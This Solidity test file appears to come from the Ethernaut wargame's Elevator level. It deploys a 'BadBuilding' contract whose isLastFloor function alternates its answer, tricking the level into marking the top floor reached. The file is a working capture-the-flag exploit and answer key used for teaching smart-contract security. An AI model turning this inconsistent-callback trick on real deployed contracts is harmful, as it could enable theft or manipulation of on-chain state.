// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {Building, Elevator} from "../levels/Elevator/Elevator.sol";
import {ElevatorFactory} from "../levels/Elevator/ElevatorFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract ElevatorTest is LevelTest {
    Elevator private level;

    constructor() {
        levelFactory = new ElevatorFactory();
    }

    function testElevator() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = Elevator(levelAddress);
    }

    function exploit() internal override {
        vm.startPrank(player);
        new BadBuilding(level).run(0);
        vm.stopPrank();
    }
}

contract BadBuilding is Building {
    bool private last;
    Elevator private immutable elevator;

    constructor(Elevator _elevator) {
      last = true;
      elevator = _elevator;
    }

    function run(uint256 floor) public {
      elevator.goTo(floor);
    }

    function isLastFloor(uint256) external returns (bool) {
        last = !last;
        return last;
    }
}
